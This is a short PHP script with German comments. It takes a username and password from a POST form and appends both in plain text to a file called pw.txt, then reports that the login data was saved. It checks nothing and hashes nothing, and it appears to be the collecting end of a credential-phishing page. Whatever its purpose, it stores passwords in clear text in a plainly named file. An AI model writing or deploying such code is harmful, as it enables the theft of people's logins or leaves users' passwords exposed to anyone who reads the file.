<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Öffne die Datei im Schreibmodus
    $file = fopen("pw.txt", "a");

    // Schreibe die Anmeldedaten in die Datei
    fwrite($file, "Name: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n\n");

    // Schließe die Datei
    fclose($file);

    // Gib eine Erfolgsmeldung zurück
    echo "Anmeldedaten erfolgreich gespeichert.";
} else {
    // Gib eine Fehlermeldung zurück, wenn die Anfrage nicht korrekt ist
    echo "Fehler bei der Anfrage.";
}
?>
